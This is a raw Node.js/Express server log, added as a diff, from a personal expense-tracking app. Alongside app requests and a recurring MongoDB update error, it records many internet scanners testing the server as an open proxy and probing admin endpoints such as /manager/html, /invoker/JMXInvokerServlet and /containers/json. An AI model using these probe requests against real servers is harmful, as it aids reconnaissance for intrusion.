@@ -1,0 +1,2815 @@
+nohup: ignoring input
+30 seconds later send the first backup email
+Mon, 16 May 2016 12:32:34 GMT body-parser deprecated bodyParser: use individual json/urlencoded middlewares at app.js:34:9
+Mon, 16 May 2016 12:32:34 GMT body-parser deprecated undefined extended: provide extended option at node_modules/body-parser/index.js:105:29
+Mon, 16 May 2016 12:32:34 GMT express-session deprecated undefined resave option; provide resave option at app.js:42:9
+Mon, 16 May 2016 12:32:34 GMT express-session deprecated undefined saveUninitialized option; provide saveUninitialized option at app.js:42:9
+Mon, 16 May 2016 12:32:34 GMT express-session deprecated req.secret; provide secret option at app.js:42:9
+Listening on port 8080
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m31.854 ms - 5317[0m
+[0mGET /accountDetail? [32m200 [0m8.486 ms - 278[0m
+[0mGET /monthHistory?userName=lilieming [32m200 [0m11.994 ms - 137[0m
+[0mGET /monthHistory?userName=lilieming [32m200 [0m3.929 ms - 137[0m
+task begin
+bakcup  data length is: undefined
+user colour.hu  has no data
+[0mGET /monthHistory?userName=lilieming [32m200 [0m4.345 ms - 137[0m
+[0mGET /monthHistory?userName=lilieming [32m200 [0m4.781 ms - 137[0m
+[0mGET /monthHistory?userName=lilieming [32m200 [0m4.706 ms - 137[0m
+[0mGET /monthHistory?userName=lilieming [32m200 [0m5.521 ms - 137[0m
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m7.463 ms - 5317[0m
+[0mGET /moneyDetail?limit=10&offset=10 [32m200 [0m7.036 ms - 4550[0m
+[0mGET /moneyDetail?limit=10&offset=20 [32m200 [0m6.872 ms - 3715[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m7.529 ms - 2732[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.9290783891921535 [0m- [0m- ms - -[0m
+[0mGET http://124.250.25.183/?ip=106.2.61.168:8080&type=http [32m200 [0m5.358 ms - 2732[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.5941922845197588 [0m- [0m- ms - -[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m1.850 ms - 2732[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.7456623942796970 [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_114943434049006482946160 [32m200 [0m4.942 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_1966436723217066281088640 [32m200 [0m3.016 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_237689358565624642336480 [32m200 [0m2.429 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_11840749580146286111616 [32m200 [0m1.580 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_135527422661522411951832 [32m200 [0m1.561 ms - 2732[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.9025168857044342 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.7836184468820937 [0m- [0m- ms - -[0m
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.6347930067941025 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_558092455213209002536940 [32m200 [0m5.356 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_139689290881974960612216 [32m200 [0m3.176 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_15785106729420137503031116 [32m200 [0m1.549 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_114943624829006483030336 [32m200 [0m1.520 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_1292487958023491264170304 [32m200 [0m2.731 ms - 2732[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.5684140599946262 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.1329153688313843 [0m- [0m- ms - -[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m3.641 ms - 2732[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.7099834765652715 [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_2291831328021536643436160 [32m200 [0m4.515 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_89462387526617703954020 [32m200 [0m1.454 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_1640036483813035962059488 [32m200 [0m1.420 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_592041106079503601488 [32m200 [0m4.725 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_1571410323202202840704976 [32m200 [0m4.097 ms - 2732[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.2661808871050012 [0m- [0m- ms - -[0m
+[0mGET /accountDetail? [32m200 [0m20.569 ms - 278[0m
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m22.279 ms - 5317[0m
+[0mGET /monthHistory? [32m200 [0m23.642 ms - 137[0m
+[0mGET /moneyDetail?limit=10&offset=10 [32m200 [0m8.236 ms - 4550[0m
+userName lilieming
+[{"userName":"lilieming","label":"早餐","modifyTime":1462972797471,"count":9,"_id":"571793131efc4003029eddbf"}] result is 
+[0mPUT /moneyDetail [32m200 [0m58.207 ms - 36[0m
+null
+null
+{ [MongoError: Mod on _id not allowed]
+  name: 'MongoError',
+  message: 'Mod on _id not allowed',
+  ok: 1,
+  n: 0,
+  code: 10148,
+  errmsg: 'Mod on _id not allowed',
+  writeConcernError: { code: 10148, errmsg: 'Mod on _id not allowed' } }
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m21.229 ms - 4972[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.1888061746028925 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET /invoker/JMXInvokerServlet [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.7541319098576189 [0m- [0m- ms - -[0m
+[0mGET http://www.ctrip.com/ [32m200 [0m5.274 ms - 2732[0m
+[0mGET http://www.sogou.com/?rands=_456092020014066643551100 [32m200 [0m2.130 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_900270440025758092898136 [32m200 [0m2.701 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_125658813722615592719460 [32m200 [0m1.561 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_771670440025758092898136 [32m200 [0m2.097 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_613963169220096103685360 [32m200 [0m1.597 ms - 2732[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.3745677773972306 [0m- [0m- ms - -[0m
+Not Found
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.7043039455276313 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.5027738612743442 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_207978838645208002199040 [32m200 [0m8.093 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_456082818013564263449640 [32m200 [0m3.061 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_721710609029717241417120 [32m200 [0m1.611 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_89462122245882403615104 [32m200 [0m1.548 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_140073908806984721711200 [32m200 [0m10.547 ms - 2732[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m3.208 ms - 2732[0m
+Not Found
+[0mGET /manager/html [0m- [0m- ms - -[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m5.941 ms - 2732[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.3621993398241535 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET /computer/ [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.8666220091390806 [0m- [0m- ms - -[0m
+[0mGET /monthHistory? [32m200 [0m33.462 ms - 137[0m
+[0mGET /accountDetail? [32m200 [0m38.336 ms - 278[0m
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m37.860 ms - 4972[0m
+[0mGET /moneyDetail?limit=10&offset=10 [32m200 [0m8.239 ms - 4896[0m
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m13.991 ms - 4972[0m
+[0mGET /monthHistory? [32m200 [0m14.087 ms - 137[0m
+[0mGET /accountDetail? [32m200 [0m12.367 ms - 278[0m
+[0mGET /moneyDetail?limit=10&offset=10 [32m200 [0m6.618 ms - 4896[0m
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m19.910 ms - 4972[0m
+[0mGET /accountDetail? [32m200 [0m3.667 ms - 278[0m
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m10.168 ms - 4972[0m
+[0mGET /moneyDetail?limit=10&offset=10 [32m200 [0m7.517 ms - 4896[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m2.573 ms - 2732[0m
+[0mGET /accountDetail? [32m200 [0m10.848 ms - 278[0m
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m12.364 ms - 4972[0m
+[0mGET /monthHistory? [32m200 [0m11.934 ms - 137[0m
+[0mGET /moneyDetail?limit=10&offset=10 [32m200 [0m5.805 ms - 4896[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.7726613145165576 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+[0mGET / [32m200 [0m5.442 ms - 2732[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_246082484025091524352880 [32m200 [0m1.328 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_98168713742756521988320 [32m200 [0m1.482 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_71523733415216122164704 [32m200 [0m1.395 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_62047238414474251761056 [32m200 [0m1.467 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_643821276010568043286396 [32m200 [0m1.345 ms - 2732[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.9281734158252434 [0m- [0m- ms - -[0m
+Not Found
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.9566216392606745 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+task begin
+bakcup  data length is: undefined
+user colour.hu  has no data
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.3083328541774529 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+[0mHEAD / [32m200 [0m4.728 ms - 2732[0m
+[0mGET http://www.sogou.com/?rands=_1929610557208920323937640 [32m200 [0m2.707 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_1900255944025383122916424 [32m200 [0m6.689 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_5019454920946443009440 [32m200 [0m1.372 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_85982735329005852361856 [32m200 [0m1.442 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_128647390046132722689120 [32m200 [0m1.379 ms - 2732[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.9893408977372117 [0m- [0m- ms - -[0m
+[0mGET /accountDetail? [32m200 [0m22.707 ms - 278[0m
+[0mGET /monthHistory? [32m200 [0m18.756 ms - 137[0m
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m22.364 ms - 4972[0m
+[0mGET /moneyDetail?limit=10&offset=10 [32m200 [0m7.467 ms - 4896[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+userName lilieming
+[{"userName":"lilieming","label":"早餐","modifyTime":1463443395028,"count":10,"_id":"571793131efc4003029eddbf"}] result is 
+[0mPUT /moneyDetail [32m200 [0m17.787 ms - 36[0m
+null
+null
+{ [MongoError: Mod on _id not allowed]
+  name: 'MongoError',
+  message: 'Mod on _id not allowed',
+  ok: 1,
+  n: 0,
+  code: 10148,
+  errmsg: 'Mod on _id not allowed',
+  writeConcernError: { code: 10148, errmsg: 'Mod on _id not allowed' } }
+userName lilieming
+[{"userName":"lilieming","label":"超市","modifyTime":1463315899160,"count":22,"_id":"5717935b1efc4003029eddc1"}] result is 
+[0mPUT /moneyDetail [32m200 [0m8.102 ms - 36[0m
+null
+null
+{ [MongoError: Mod on _id not allowed]
+  name: 'MongoError',
+  message: 'Mod on _id not allowed',
+  ok: 1,
+  n: 0,
+  code: 10148,
+  errmsg: 'Mod on _id not allowed',
+  writeConcernError: { code: 10148, errmsg: 'Mod on _id not allowed' } }
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m5.026 ms - 4788[0m
+[0mGET /accountDetail? [32m200 [0m7.695 ms - 278[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.4386414821231353 [0m- [0m- ms - -[0m
+Not Found
+[0mGET / [32m200 [0m2.466 ms - 2732[0m
+[0mGET /index.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.7482925323390270 [0m- [0m- ms - -[0m
+[0mGET / [32m200 [0m1.427 ms - 2732[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.8597084155379406 [0m- [0m- ms - -[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m1.602 ms - 2732[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.3312411710259420 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.2010475469268073 [0m- [0m- ms - -[0m
+Not Found
+Not Found
+[0mGET /manager/html [0m- [0m- ms - -[0m
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m6.358 ms - 2732[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.4507774128824312 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_79688931122727144680544 [32m200 [0m1.906 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_128647917906132722785160 [32m200 [0m1.475 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_21648308406166848218240 [32m200 [0m16.684 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_2287680031823447371699928 [32m200 [0m1.430 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_6930121149627878763434728 [32m200 [0m1.425 ms - 2732[0m
+[0mGET http://www.sogou.com/?rands=_92164270649403024675272 [32m200 [0m1.361 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_92044280926947641499232 [32m200 [0m1.701 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_1430191841211303104693228 [32m200 [0m8.277 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_145632572024503251093760 [32m200 [0m2.019 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_3990224928725811276600 [32m200 [0m1.475 ms - 2732[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.0154032207444461 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.6950696986307067 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.4273079194977192 [0m- [0m- ms - -[0m
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.6715201039819417 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.4276383072541192 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET /containers/json [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.9787177419050524 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m7.880 ms - 2732[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET /script [0m- [0m- ms - -[0m
+Not Found
+[0mGET /zabbix/index.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET /axis2/axis2-admin/ [0m- [0m- ms - -[0m
+Not Found
+[0mGET /invoker/JMXInvokerServlet [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.8539022042758773 [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_1134024537819430581959936 [32m200 [0m2.549 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_20840728804354351414140 [32m200 [0m1.463 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_2711779170911586399556 [32m200 [0m1.397 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_145632572025483381196300 [32m200 [0m1.601 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_3585394264860402794480 [32m200 [0m4.155 ms - 2732[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.0079747267508131 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://testp3.pospr.waw.pl/testproxy.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+[0mGET / [32m200 [0m8.291 ms - 2732[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.5598457282455378 [0m- [0m- ms - -[0m
+[0mGET http://119.90.40.16:8090/ [32m200 [0m2.007 ms - 2732[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.1730964875307603 [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_510789580260726464848 [32m200 [0m4.890 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_491470325623201252453632 [32m200 [0m1.635 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_102086527886587251654912 [32m200 [0m2.884 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_24481566729001201260336 [32m200 [0m1.334 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_409557915219489052146928 [32m200 [0m1.348 ms - 2732[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://azenv.net/ [32m200 [0m1.391 ms - 2732[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.6021264597226752 [0m- [0m- ms - -[0m
+[0mGET http://azenv.net/ [32m200 [0m1.990 ms - 2732[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.2786873593822255 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_102156261909042483805320 [32m200 [0m9.819 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_2002075592820603222843568 [32m200 [0m1.567 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_51567805410843802694708 [32m200 [0m1.381 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_59852952181009824387240 [32m200 [0m3.244 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_89327253208168192016924 [32m200 [0m1.455 ms - 2732[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.2354775173678776 [0m- [0m- ms - -[0m
+[0mGET / [32m200 [0m1.372 ms - 2732[0m
+[0mGET http://115.239.210.27/ [32m200 [0m1.386 ms - 2732[0m
+task begin
+user colour.hu  has no data
+bakcup  data length is: undefined
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.9300219462290694 [0m- [0m- ms - -[0m
+Not Found
+Not Found
+[0mGET http://proxyjudge.us/ [32m200 [0m1.839 ms - 2732[0m
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET /manager/html [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.6294265170543272 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_4655147609037868401198600 [32m200 [0m3.527 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_8574114436854310148699264 [32m200 [0m1.380 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_1323040415229145872910208 [32m200 [0m1.387 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_3325196812725811276600 [32m200 [0m1.385 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_673213434013949103344628 [32m200 [0m1.414 ms - 2732[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
